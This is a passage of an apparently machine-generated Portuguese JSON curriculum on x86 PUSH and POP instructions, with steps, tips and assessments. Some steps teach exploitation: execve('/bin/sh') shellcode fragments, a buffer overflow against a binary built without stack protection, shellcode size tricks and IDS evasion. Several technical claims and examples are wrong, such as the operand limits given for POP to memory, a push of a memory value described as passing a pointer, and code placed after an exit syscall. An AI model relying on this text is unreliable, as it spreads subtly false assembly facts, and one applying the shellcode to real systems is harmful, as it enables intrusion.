                                    "Editor de texto (Vim/Nano), GDB, código template"
                                  ],
                                  "tips": "Use 'stepi' para executar instrução por instrução.",
                                  "learningObjective": "Executar e depurar PUSH isoladamente.",
                                  "commonMistakes": [
                                    "PUSH de registrador 64 bits em 32 bits",
                                    "Não zerar registradores de teste"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar PUSH para preservação antes de chamadas de sistema",
                                  "subSteps": [
                                    "Prepare syscall int 0x80: mov eax, 1 (exit); mov ebx, 0; int 0x80.",
                                    "Insira PUSH EAX antes: mov eax, 0xDEADBEEF; push eax; (faça syscall); pop eax.",
                                    "Verifique preservação: valor em EAX mantido após int 0x80.",
                                    "Simule cenário real: preserve múltiplos registradores antes de write(4).",
                                    "Teste falha sem PUSH: altere EAX durante syscall."
                                  ],
                                  "verification": "Execute e confirme que valor empilhado é restaurado corretamente após syscall.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Syscall table Linux 32 bits, GDB"
                                  ],
                                  "tips": "Monitore ESP para evitar overflow de stack em testes múltiplos.",
                                  "learningObjective": "Usar PUSH para salvar registradores voláteis em rotinas.",
                                  "commonMistakes": [
                                    "Esquecer de POP correspondente (leak de stack)",
                                    "Usar registradores errados para syscall"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Analisar e otimizar uso de PUSH em contextos reais",
                                  "subSteps": [
                                    "Analise binário com objdump: objdump -d exec | grep PUSH.",
                                    "Identifique padrões em shellcode: PUSH para setup de argumentos.",
                                    "Otimize: use PUSH imm32 vs PUSH reg quando aplicável.",
                                    "Teste em cenário de exploit: preserve EAX antes de execve syscall.",
                                    "Documente observações em relatório curto."
                                  ],
                                  "verification": "Gere disassembly mostrando PUSH correto e explique seu papel.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "objdump, exemplo de shellcode Linux/x86"
                                  ],
                                  "tips": "Evite PUSH em loops apertados; prefira sub esp,4; mov [esp],reg.",
                                  "learningObjective": "Integrar PUSH em fluxos complexos de análise binária.",
                                  "commonMistakes": [
                                    "PUSH de valores grandes sem alinhamento",
                                    "Ignorar convenções de calling (cdecl/stdcall)"
                                  ]
                                }
                              ],
                              "practicalExample": "Exemplo de código assembly (salve como push_test.asm):\nsection .text\nglobal _start\n_start:\n    mov eax, 0x12345678\n    push eax\n    mov eax, 1      ; Sys_exit\n    mov ebx, 0\n    int 0x80\n    pop eax\nCompile: nasm -f elf32 push_test.asm && ld -m elf_i386 push_test.o -o push_test\nGDB: gdb ./push_test, break _start+5, run, x/xw $esp (deve mostrar 0x12345678).",
                              "finalVerifications": [
                                "Explicar mudança em ESP após PUSH EAX.",
                                "Escrever código que preserva EAX antes de int 0x80 e restaura.",
                                "No GDB, inspecionar stack corretamente após múltiplos PUSH.",
                                "Identificar PUSH em disassembly de binário.",
                                "Diferenciar PUSH reg de PUSH imm.",
                                "Simular erro sem preservação e corrigir."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição do mecanismo de stack (ESP e memória).",
                                "Código assembly compilável e funcional sem crashes.",
                                "Uso correto de GDB para verificação passo a passo.",
                                "Entendimento contextual em syscalls (preservação).",
                                "Identificação de erros comuns e soluções.",
                                "Relatório claro de testes e observações."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Pilha e registradores x86.",
                                "Sistemas Operacionais: Syscalls Linux int 0x80.",
                                "Programação em C: Convenções de calling e prologue/epílogo.",
                                "Segurança da Informação: Análise de shellcode e exploits.",
                                "Engenharia Reversa: Disassembly com objdump/radare2."
                              ],
                              "realWorldApplication": "Em análise de malware e reverse engineering, PUSH é usado para preservar registradores voláteis antes de syscalls em shellcodes, permitindo detecção de payloads que setupam argumentos na stack sem corromper contexto do processo infectado."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.4.3.2",
                            "name": "PUSH de imediato",
                            "description": "Empilhar valor constante, como PUSH 0x1234, útil para shellcodes compactos em explorações de buffer overflow.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Conceito e Funcionamento da Instrução PUSH Imediato",
                                  "subSteps": [
                                    "Estude a documentação oficial da Intel para instruções x86 PUSH",
                                    "Identifique que PUSH imediato carrega um valor constante (imediato) diretamente na stack",
                                    "Analise o impacto no registrador ESP (Stack Pointer), que decrementa antes de escrever",
                                    "Compare PUSH imediato com PUSH de registrador ou memória",
                                    "Visualize diagramaticamente o estado da stack antes e depois da execução"
                                  ],
                                  "verification": "Explique por escrito ou verbalmente o que PUSH 0x1234 faz ao ESP e à stack, incluindo mudança de endereço.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Manual Intel x86 (PDF ou online)",
                                    "Simulador de assembly como x86emu ou diagramas de stack"
                                  ],
                                  "tips": "Lembre-se: stack cresce para baixo em x86 (endereços menores).",
                                  "learningObjective": "Dominar o mecanismo de empilhamento de valores imediatos na stack x86.",
                                  "commonMistakes": [
                                    "Confundir direção de crescimento da stack",
                                    "Ignorar decremento de 4 bytes no ESP para 32-bit"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Dominar Sintaxe, Montagem e Disassembly",
                                  "subSteps": [
                                    "Escreva código assembly simples: section .text; global _start; _start: push 0x1234; mov eax,1; int 0x80",
                                    "Compile com NASM: nasm -f elf32 arquivo.asm -o arquivo.o",
                                    "Linke com ld: ld -m elf_i386 arquivo.o -o exec",
                                    "Execute e use GDB para observar stack: gdb ./exec, break _start, run, x/4x $esp",
                                    "Disasseble com objdump: objdump -d exec para ver bytes gerados"
                                  ],
                                  "verification": "Gere um executável que empilha 0x1234 e confirme via GDB que o valor está na stack em [esp].",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "NASM assembler",
                                    "ld linker",
                                    "GDB debugger",
                                    "objdump"
                                  ],
                                  "tips": "Use -f elf32 para 32-bit compatibility em sistemas modernos.",
                                  "learningObjective": "Escrever, montar e debugar PUSH imediato em ambiente real.",
                                  "commonMistakes": [
                                    "Esquecer de definir _start para Linux",
                                    "Usar sintaxe errada (ex: push dword 0x1234 em alguns assemblers)"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Aprender Encoding Manual do Opcode PUSH Imediato",
                                  "subSteps": [
                                    "Memorize opcode: 68 seguido de 4 bytes little-endian do imediato (ex: PUSH 0x12345678 -> 68 78 56 34 12)",
                                    "Converta manualmente: 0x1234 em little-endian é 34 12 00 00 para imm32",
                                    "Escreva bytes em hex editor ou Python: print(bytes([0x68, 0x34, 0x12, 0x00, 0x00]))",
                                    "Teste injetando bytes em shellcode simples via Python pwntools ou metasm",
                                    "Verifique com ndisasm ou radare2: ndisasm -b32 shellcode.bin"
                                  ],
                                  "verification": "Escreva os 5 bytes exatos para PUSH 0x1234 e confirme disassembly produz 'push dword 0x1234'.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Tabela de opcodes x86",
                                    "Python ou hex editor",
                                    "ndisasm ou radare2"
                                  ],
                                  "tips": "Sempre little-endian: baixo byte primeiro.",
                                  "learningObjective": "Codificar PUSH imediato manualmente para shellcodes sem assembler.",
                                  "commonMistakes": [
                                    "Endianness errada (big-endian)",
                                    "Esquecer padding de zeros para imm32"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar em Shellcodes Compactos para Exploração",
                                  "subSteps": [
                                    "Crie shellcode básico: empilhe '/bin' com múltiplos PUSH imm para string",
                                    "Exemplo: push 0x6e69622f; push 0x68732f2f; mov ebx,esp; ... execve",
                                    "Teste em ambiente controlado: buffer overflow simples em C vulnerable",
                                    "Compile vulnerable: gcc -fno-stack-protector -z execstack vuln.c -o vuln",
                                    "Exploite com Python: cyclic pattern para offset, então shellcode com PUSH",
                                    "Debug com GDB para confirmar empilhamento correto sem crash"
                                  ],
                                  "verification": "Execute exploit que usa PUSH imm para retornar shell sem segfault.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Código vulnerable exemplo",
                                    "pwntools Python lib",
                                    "GDB-PEDA ou gef"
                                  ],
                                  "tips": "Use null-free immediatos (evite 0x00 em strings).",
                                  "learningObjective": "Integrar PUSH imm em payloads reais para buffer overflows.",
                                  "commonMistakes": [
                                    "NOP sled inadequado",
                                    "Offset de buffer calculado errado",
                                    "Bad chars no shellcode"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um shellcode de 25 bytes para Linux x86 execve('/bin/sh'): push 0x68732f2f ('//sh'); push 0x6e69622f ('/bin'); mov ebx, esp; ... Isso empilha string alinhada compactamente sem registradores voláteis.",
                              "finalVerifications": [
                                "Explica o opcode 68 e little-endian encoding para qualquer imm32",
                                "Monta e debuga PUSH 0x1234 em GDB mostrando stack correta",
                                "Codifica manualmente PUSH imm sem erros de endianness",
                                "Integra em shellcode que spawna shell em buffer overflow controlado",
                                "Identifica quando usar PUSH imm vs alternativas para compactação",
                                "Verifica shellcode com /bin/sh via strace ou hexdump"
                              ],
                              "assessmentCriteria": [
                                "Precisão no encoding (100% match com disassembly)",
                                "Execução sem crash em debugger (stack intacta)",
                                "Compactação efetiva: shellcode < 50 bytes funcional",
                                "Explicação clara de ESP mudança e stack state",
                                "Aplicação ética em ambiente isolado (VM)",
                                "Detecção e correção de erros comuns como null bytes"
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Stack management e registradores",
                                "Programação em C: Buffer overflows e ASLR bypass",
                                "Análise Reversing: Disassembly com IDA/Ghidra",
                                "Criptografia: Encoding para evasão de detecção",
                                "Redes: Payloads em exploits remotos"
                              ],
                              "realWorldApplication": "Em pentesting ético e CTFs (ex: pwn.college), PUSH imediato permite shellcodes ultra-compactos para ROP chains ou stage-1 payloads em buffer overflows, reduzindo footprint e evadindo filtros de IDS."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.4.3.3",
                            "name": "PUSH de endereço de memória",
                            "description": "Empilhar valor de memória, ex: PUSH DWORD PTR [EBX], para passar ponteiros em funções.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos Básicos de PUSH e Endereçamento Indireto",
                                  "subSteps": [
                                    "Revisar o funcionamento da pilha (stack) em arquitetura x86 e o papel da instrução PUSH.",
                                    "Diferenciar PUSH de valor imediato, registrador e memória direta.",
                                    "Explicar o endereçamento indireto: uso de [registrador] para acessar valor em memória.",
                                    "Analisar o impacto na pilha: decremento de ESP e armazenamento do valor.",
                                    "Estudar especificadores de tamanho como DWORD PTR para evitar ambiguidades."
                                  ],
                                  "verification": "Explicar por escrito ou verbalmente a diferença entre 'PUSH EAX' e 'PUSH DWORD PTR [EBX]', incluindo mudanças em ESP.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação Intel x86 Manual (Volume 2)",
                                    "Simulador de Assembly online como Godbolt ou NASM"
                                  ],
                                  "tips": "Visualize a stack crescendo para baixo (endereços menores); [EBX] carrega o conteúdo do endereço em EBX.",
                                  "learningObjective": "Dominar os fundamentos de PUSH indireto e seu efeito na stack.",
                                  "commonMistakes": [
                                    "Confundir PUSH [EBX] com PUSH EBX (empilha endereço vs conteúdo)",
                                    "Ignorar especificador PTR, causando erros de montagem"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Sintaxe e Montagem de PUSH de Endereço de Memória",
                                  "subSteps": [
                                    "Escrever instruções como 'PUSH DWORD PTR [EBX]' em um assembler (NASM ou MASM).",
                                    "Testar variações: [EBX+4], [EBP-8] para offsets comuns em frames de pilha.",
                                    "Compilar um snippet C simples que gere PUSH de ponteiro e disassemblar com objdump.",
                                    "Verificar o opcode gerado (FF /6 para PUSH r/m32).",
                                    "Simular execução passo a passo em papel ou ferramenta."
                                  ],
                                  "verification": "Montar e executar um código assembly simples com PUSH [EBX], confirmando valor empilhado via dump de memória.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "NASM ou MASM assembler",
                                    "Compilador GCC com -S para gerar assembly",
                                    "Ferramenta objdump"
                                  ],
                                  "tips": "Use 'DWORD PTR' explicitamente para clareza, especialmente em debuggers.",
                                  "learningObjective": "Montar corretamente instruções PUSH indiretas e gerar assembly equivalente de C.",
                                  "commonMistakes": [
                                    "Esquecer offset em frames de pilha como [EBP+8]",
                                    "Usar tamanho errado (BYTE vs DWORD), causando truncamento"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Aplicar PUSH de Memória em Chamadas de Função",
                                  "subSteps": [
                                    "Analisar código C com passagem de ponteiro: void func(int* p) {} -> PUSH [endereço].",
                                    "Disassemblar uma função real e identificar PUSH de argumento via ponteiro.",
                                    "Simular passagem de ponteiro para função em assembly puro.",
                                    "Executar em debugger, observando stack antes/depois da PUSH.",
                                    "Modificar valor em memória e observar propagação na função chamada."
                                  ],
                                  "verification": "Em debugger, passo a passo uma chamada com PUSH [EBX] e confirme ponteiro correto na stack.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Debugger x64dbg ou OllyDbg",
                                    "Exemplo C compilado em binário",
                                    "Ghidra ou IDA Free para análise estática"
                                  ],
                                  "tips": "Em convenções de chamada stdcall/cdecl, ponteiros são empilhados da direita para esquerda.",
                                  "learningObjective": "Usar PUSH indireto para simular passagem de ponteiros em funções assembly.",
                                  "commonMistakes": [
                                    "Empilhar endereço em vez de conteúdo (PUSH EBX ao invés de [EBX])",
                                    "Desalinhamento da stack em 4 bytes"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar Análise e Debugging de PUSH em Binários",
                                  "subSteps": [
                                    "Carregar um binário real (ex: malware sample ou programa simples) em debugger.",
                                    "Identificar e breakpoint em PUSH [reg] durante execução.",
                                    "Rastrear origem do registrador (EBX) e valor empilhado.",
                                    "Simular exploit: alterar memória apontada e observar crash ou comportamento.",
                                    "Documentar o fluxo: de PUSH à POP ou uso em CALL."
                                  ],
                                  "verification": "Produzir relatório curto com screenshot de debugger mostrando PUSH [EBX] e valor na stack.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "x64dbg ou WinDbg",
                                    "Binário de teste com ponteiros (ex: crackme)",
                                    "Referência de convenções de chamada"
                                  ],
                                  "tips": "Use hardware breakpoints em [EBX] para pausar antes da PUSH.",
                                  "learningObjective": "Analisar PUSH indireto em contextos reais de binários para segurança.",
                                  "commonMistakes": [
                                    "Não rastrear setup do registrador antes da PUSH",
                                    "Confundir stack com heap em análises"
                                  ]
                                }
                              ],
                              "practicalExample": "Em assembly gerado de C: int main() { int x = 42; func(&x); } disassembla para MOV EBX, OFFSET x; PUSH DWORD PTR [EBX]; CALL func; // Passa ponteiro para x na stack.",
                              "finalVerifications": [
                                "Explicar o efeito de PUSH DWORD PTR [EBX] na stack e registradores.",
                                "Montar e executar código com PUSH indireto sem erros.",
                                "Identificar PUSH de ponteiro em disassembly de binário real.",
                                "Simular em debugger o passo a passo de uma chamada com ponteiro.",
                                "Diferenciar PUSH de memória de outros tipos em análise rápida.",
                                "Prever comportamento ao modificar memória antes da PUSH."
                              ],
                              "assessmentCriteria": [
                                "Precisão na sintaxe e uso de especificadores (PTR, offsets).",
                                "Compreensão correta do impacto na stack (ESP, alinhamento).",
                                "Habilidade em disassemblar e debugar cenários reais.",
                                "Identificação de erros comuns e correções proativas.",
                                "Aplicação contextual em chamadas de função e ponteiros.",
                                "Relatórios claros com evidências (screenshots, dumps)."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Equivalência com passagem de ponteiros por referência.",
                                "Sistemas Operacionais: Convenções de pilha e calling conventions (cdecl, stdcall).",
                                "Segurança Computacional: Exploração de stack em buffer overflows via ponteiros.",
                                "Engenharia Reversa: Análise estática/dinâmica em ferramentas como IDA/Ghidra.",
                                "Arquitetura de Computadores: Endereçamento de memória e registradores x86."
                              ],
                              "realWorldApplication": "Em análise de malware e reverse engineering, identificar como atacantes empilham ponteiros para shellcodes ou funções remotas, permitindo detecção de exploits em binários reais."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.4.4",
                        "name": "Instrução POP",
                        "description": "A instrução POP lê da pilha, incrementa ESP/RSP e armazena no destino, essencial para restauração de registradores e desempilhamento após chamadas.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.4.4.1",
                            "name": "POP para registrador",
                            "description": "Desempilhar em registrador, ex: POP EAX, recuperando valores salvos em sequências de código.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o conceito de pilha e instruções PUSH/POP",
                                  "subSteps": [
                                    "Estude a pilha (stack) como estrutura LIFO (Last In, First Out) na arquitetura x86.",
                                    "Aprenda como o registrador ESP aponta para o topo da pilha.",
                                    "Entenda PUSH: decrementa ESP e armazena valor na memória.",
                                    "Entenda POP: carrega valor da memória em registrador e incrementa ESP.",
                                    "Visualize diagramas da pilha antes e depois de PUSH/POP."
                                  ],
                                  "verification": "Desenhe um diagrama da pilha mostrando PUSH 0x10 seguido de POP EAX, confirmando que EAX = 0x10 e ESP restaurado.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação Intel x86 manuals (Volume 2)",
                                    "Diagramas de pilha online (ex: felixcloutier.com)"
                                  ],
                                  "tips": "Sempre pense na pilha crescendo para baixo na memória (endereços menores).",
                                  "learningObjective": "Explicar o papel da pilha e o ciclo PUSH/POP em assembly x86.",
                                  "commonMistakes": [
                                    "Confundir ordem LIFO com FIFO.",
                                    "Ignorar alinhamento de 4 bytes em x86-32.",
                                    "Esquecer que POP modifica ESP."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Dominar a sintaxe da instrução POP para registrador",
                                  "subSteps": [
                                    "Memorize a sintaxe: POP reg (ex: POP EAX, onde reg é 32-bit como EAX, EBX).",
                                    "Estude opcodes: 58h + reg para registradores principais.",
                                    "Aprenda restrições: não pode POP em segmento imediato ou memória diretamente para registrador simples.",
                                    "Revise flags afetadas: nenhuma flag é alterada por POP.",
                                    "Compare com POP memória ou POPF para contexto."
                                  ],
                                  "verification": "Escreva 3 exemplos válidos de POP reg e identifique erros em 2 inválidos.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Referência de instruções x86 (sandpile.org)",
                                    "Editor de texto para listar exemplos"
                                  ],
                                  "tips": "Use registradores de propósito geral como EAX para prática inicial.",
                                  "learningObjective": "Identificar e escrever corretamente instruções POP reg em assembly.",
                                  "commonMistakes": [
                                    "Usar POP com registradores de segmento sem prefixo.",
                                    "Confundir POP com MOV de [ESP].",
                                    "Esquecer que POP é atômico."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar e executar um programa com POP registrador",
                                  "subSteps": [
                                    "Escreva código assembly: section .data com valor, section .text com PUSH valor; POP EAX.",
                                    "Monte com NASM: nasm -f elf32 programa.asm -o programa.o; ld programa.o -o programa.",
                                    "Execute e verifique com gdb: gdb programa; break *main; run; x/1xw $eax.",
                                    "Teste variações: múltiplos PUSH/POP e verifique pilha balanceada.",
                                    "Adicione sys_exit para programa standalone."
                                  ],
                                  "verification": "Execute o programa no GDB e confirme que EAX recebe o valor empilhado sem desalinhamento de pilha.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "NASM assembler",
                                    "GDB ou x64dbg debugger",
                                    "Linux/VM com assembly tools"
                                  ],
                                  "tips": "Sempre balanceie PUSH e POP para evitar stack overflow/underflow.",
                                  "learningObjective": "Montar, executar e debugar código com POP reg.",
                                  "commonMistakes": [
                                    "Stack não alinhada causando crashes.",
                                    "Falta de sys_exit fechando programa incorretamente.",
                                    "Usar registrador errado no GDB."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar POP em sequências de código binário para segurança",
                                  "subSteps": [
                                    "Carregue um binário em disassembler (ex: IDA Pro ou Ghidra).",
                                    "Identifique sequências PUSH; CALL; POP reg em funções.",
                                    "Trace execução: simule pilha manualmente para prever valor em reg.",
                                    "Detecte anomalias: POP sem PUSH correspondente (possível exploit).",
                                    "Pratique em binários reais: hello world compilado ou samples de malware."
                                  ],
                                  "verification": "Analise um snippet binário e explique o fluxo de valores via POP em relatório curto.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Ghidra ou x64dbg",
                                    "Binários de teste (ex: compilados de C com -O0)"
                                  ],
                                  "tips": "Procure padrões prologue/epílogo de funções: PUSH EBP; ... ; POP EBP.",
                                  "learningObjective": "Aplicar POP reg na análise reversa de binários para detecção de vulnerabilidades.",
                                  "commonMistakes": [
                                    "Ignorar ordem de execução em loops.",
                                    "Confundir POP com RET.",
                                    "Não rastrear ESP durante análise."
                                  ]
                                }
                              ],
                              "practicalExample": "Em análise de malware: código suspeito faz PUSH 0xDEADBEEF; CALL vulnerable_func; POP EAX. Após CALL, POP EAX restaura 0xDEADBEEF em EAX, potencialmente bypassando verificações de integridade.",
                              "finalVerifications": [
                                "Explicar verbalmente o efeito de POP EAX em ESP e EAX.",
                                "Executar programa com PUSH/POP sem crash ou desalinhamento.",
                                "Identificar POP reg em disassembler de binário real.",
                                "Simular pilha para sequência PUSH EBX; POP EAX corretamente.",
                                "Detectar erro em código com POP sem PUSH correspondente."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição do ciclo PUSH/POP (100% correto).",
                                "Código montado executa sem erros (GDB confirma valores).",
                                "Análise de binário identifica pelo menos 2 usos de POP reg.",
                                "Diagrama da pilha é claro e preciso.",
                                "Relatório de análise explica implicações de segurança."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Registradores e memória.",
                                "Programação em C: Stack frames e chamadas de função.",
                                "Segurança da Informação: Reverse engineering e exploits de buffer.",
                                "Sistemas Operacionais: Gerenciamento de pilha em contextos de thread."
                              ],
                              "realWorldApplication": "Na análise forense digital e detecção de malware, POP reg é usado para restaurar registradores após chamadas, ajudando a mapear fluxos de controle e identificar injeções de shellcode em binários maliciosos."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.4.4.2",
                            "name": "POP para memória",
                            "description": "Desempilhar diretamente em memória, como POP DWORD PTR [EBX], menos comum mas útil em otimizações de shellcode.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Funcionamento Básico da Instrução POP para Memória",
                                  "subSteps": [
                                    "Revise a instrução POP padrão (de stack para registrador) e observe como ela ajusta o ESP.",
                                    "Estude a variação POP para memória, que desempilha diretamente para um endereço de memória indireto.",
                                    "Analise o comportamento do ESP: ele é incrementado após a desempilhação, independentemente do destino.",
                                    "Compare com PUSH para memória para entender simetria na stack.",
                                    "Identifique quando usar: cenários onde evitar registradores intermediários economiza bytes em shellcode."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito como o ESP muda após POP DWORD PTR [EBX] e desenhe um diagrama da stack antes/depois.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação Intel x86 manuals (Vol. 2)",
                                    "Emulador como DOSBox ou QEMU"
                                  ],
                                  "tips": "Sempre pense na stack crescendo para baixo (endereços menores); visualize com desenhos.",
                                  "learningObjective": "Entender o mecanismo de desempilhamento direto para memória e seu impacto no ponteiro de stack.",
                                  "commonMistakes": [
                                    "Confundir com MOV [EBX], ESP (que não ajusta stack)",
                                    "Esquecer que só operandos de memória indiretos via registrador são permitidos."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Dominar a Sintaxe e Restrições de Operandos",
                                  "subSteps": [
                                    "Memorize sintaxe: POP r/m32 (onde r/m é registrador base como EBX, sem deslocamentos complexos em modos básicos).",
                                    "Liste registradores válidos: EBX, EBP, ESI, EDI (não EAX, ECX, EDX, ESP diretamente).",
                                    "Teste em assembly: escreva POP DWORD PTR [EBX] e verifique erros de sintaxe no NASM.",
                                    "Explore modos de endereço: [reg], [reg + disp8], mas evite complexos para shellcode.",
                                    "Verifique flags afetadas: apenas ajusta ESP, sem alterar flags como ZF ou CF."
                                  ],
                                  "verification": "Escreva 3 variações válidas de POP para memória e 2 inválidas, justificando cada uma.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "NASM assembler",
                                    "Referência de instruções x86 (sandboxie ou cheat sheet)"
                                  ],
                                  "tips": "Use 'DWORD PTR' explicitamente para clareza; teste em 32-bit mode.",
                                  "learningObjective": "Identificar sintaxe correta e restrições de operandos para POP memória.",
                                  "commonMistakes": [
                                    "Usar ESP como base (causa #GP fault)",
                                    "Omitir tamanho PTR em operandos ambíguos."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar e Testar Código Exemplo",
                                  "subSteps": [
                                    "Escreva um snippet: PUSH 0x41424344; MOV EBX, 0xdeadbeef; POP DWORD PTR [EBX]; verifique memória em [EBX].",
                                    "Assemble com NASM: nasm -f elf32 exemplo.asm; ld -m elf_i386 exemplo.o -o exemplo.",
                                    "Execute em debugger: use GDB ou OllyDbg para step-through e inspecionar ESP e [EBX].",
                                    "Adicione breakpoints: observe stack pop e memória escrita atomicamente.",
                                    "Teste edge cases: stack desalinhada ou valores grandes."
                                  ],
                                  "verification": "Capture screenshot do debugger mostrando [EBX] = 0x41424344 e ESP incrementado por 4.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "NASM, ld",
                                    "GDB ou x32dbg",
                                    "Máquina Linux/Windows 32-bit VM"
                                  ],
                                  "tips": "Use seções .text alinhadas; inicie com PUSHs para simular stack real.",
                                  "learningObjective": "Montar, executar e depurar código usando POP para memória.",
                                  "commonMistakes": [
                                    "Não alinhar stack (causa crashes)",
                                    "Interpretar bytes errados em hex dump."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar em Otimizações de Shellcode",
                                  "subSteps": [
                                    "Analise shellcode padrão: identifique sequências PUSH + MOV [reg] que podem ser POP [reg].",
                                    "Otimize exemplo: substitua PUSH eax; MOV [ebx], eax por PUSH eax; POP DWORD PTR [EBX].",
                                    "Meça redução de bytes: compare tamanhos antes/depois.",
                                    "Teste em ambiente shellcode: injete em buffer overflow simulado e verifique execução.",
                                    "Avalie trade-offs: economia de bytes vs. portabilidade (só x86 32-bit)."
                                  ],
                                  "verification": "Gere shellcode otimizado <10 bytes menor, demonstre execução bem-sucedida em exploit simulado.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Metasploit msfvenom para baseline",
                                    "Immunity Debugger",
                                    "Python para payload tester"
                                  ],
                                  "tips": "Foque em shellcode position-independent; evite null bytes.",
                                  "learningObjective": "Usar POP memória para otimizar shellcode em cenários de análise de segurança.",
                                  "commonMistakes": [
                                    "Ignorar dependências de registrador",
                                    "Quebrar fluxo ao alterar ESP incorretamente."
                                  ]
                                }
                              ],
                              "practicalExample": "Em shellcode de bind shell otimizado: PUSH 0x67616c66; POP DWORD PTR [EBX] onde EBX aponta para flags de socket, economizando 2 bytes vs. PUSH + MOV e ajustando stack implicitamente.",
                              "finalVerifications": [
                                "Explicar diferença entre POP reg e POP [mem] em termos de bytes e performance.",
                                "Montar e executar snippet sem erros, confirmando valor desempilhado em memória.",
                                "Identificar 3 usos em shellcode real (ex: metasploit payloads).",
                                "Depurar falha comum: stack corruption via POP inválido.",
                                "Calcular mudança em ESP para múltiplos POPs consecutivos."
                              ],
                              "assessmentCriteria": [
                                "Precisão na sintaxe e operandos (sem erros de assemble).",
                                "Correta visualização de stack e memória no debugger.",
                                "Otimização demonstrada com redução mensurável de bytes.",
                                "Explicação clara de verificações e erros comuns.",
                                "Aplicação contextual em segurança (análise, não criação maliciosa)."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Modelos de stack e ponteiro ESP.",
                                "Programação Assembly: Instruções de pilha e modos de endereço.",
                                "Segurança da Informação: Análise reversa de exploits e shellcode.",
                                "Sistemas Operacionais: Syscalls e manipulação de memória em ring 3."
                              ],
                              "realWorldApplication": "Em análise de malware e CTFs de segurança, otimizar shellcode para bypass de filtros de comprimento ou detecção de padrões, permitindo engenharia reversa eficiente de binários maliciosos."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.4.4.3",
                            "name": "Sequência PUSH/POP para troca",
                            "description": "Usar PUSH/POP para trocar valores entre registradores indiretamente, demonstrando manipulação de pilha em cenários de reversa.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar funcionamento básico de PUSH e POP em x86",
                                  "subSteps": [
                                    "Estude a documentação de PUSH: move valor de registrador para topo da stack (ESP -= 4, [ESP] = reg).",
                                    "Estude POP: remove topo da stack para registrador (reg = [ESP], ESP += 4).",
                                    "Simule PUSH EAX e POP EBX em papel, rastreando ESP e valores.",
                                    "Identifique LIFO (Last In First Out) da stack.",
                                    "Pratique com 2-3 exemplos simples em um simulador online."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito como PUSH/POP alteram ESP e stack, com diagrama.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação Intel x86",
                                    "Simulador online como https://www.cs.brown.edu/courses/cs033/docs/guides/x86-asm/asm_2.html"
                                  ],
                                  "tips": "Sempre desenhe a stack como uma pilha vertical para visualizar melhor.",
                                  "learningObjective": "Compreender mecânica exata de PUSH/POP e impacto no registrador ESP.",
                                  "commonMistakes": [
